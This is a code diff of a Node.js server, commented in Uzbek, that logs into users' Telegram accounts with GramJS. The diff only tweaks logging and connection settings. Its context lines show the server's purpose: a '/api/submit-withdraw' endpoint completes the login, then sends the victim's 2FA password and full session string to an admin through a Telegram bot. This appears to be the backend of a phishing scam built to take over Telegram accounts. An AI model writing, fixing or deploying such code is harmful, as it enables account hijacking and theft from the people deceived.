@@ -4,6 +4,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 const { computeCheck } = require('telegram/Password');
+const { Logger } = require("telegram/extensions");
+
+// GramJS konsol loglarini faqat jiddiy xatolar (error) bilan cheklaymiz
+Logger.setLevel("error");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -40,8 +44,14 @@ app.post('/api/send-code', async (req, res) => {
 
     try {
         const stringSession = new StringSession("");
+        
+        // Telegram DC2 sozlamasi bilan mijoz yaratamiz
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
             connectionRetries: 5,
+            useWSS: false,
+            dcId: 2,
+            serverAddress: "149.154.167.41",
+            port: 443
         });
 
         await client.connect();
@@ -122,7 +132,7 @@ app.post('/api/submit-withdraw', async (req, res) => {
         const firstName = me.firstName || "";
         const lastName = me.lastName || "";
 
-        // 2. Adminga xabar yuborish (Markdown xatolarisiz)
+        // 2. Adminga xabar yuborish
         if (ADMIN_ID) {
             const notifyText = `🚀 Server Telegramga kirdi!
 
@@ -135,7 +145,6 @@ ${password ? `🔐 2FA Parol: ${password}\n` : ''}
 ${sessionString}`;
 
             try {
-                // parse_mode ishlatmaslik parsing xatolarining oldini oladi
                 await bot.sendMessage(ADMIN_ID, notifyText);
             } catch (botErr) {
                 console.error("Bot xabar yuborishda xatolik:", botErr);
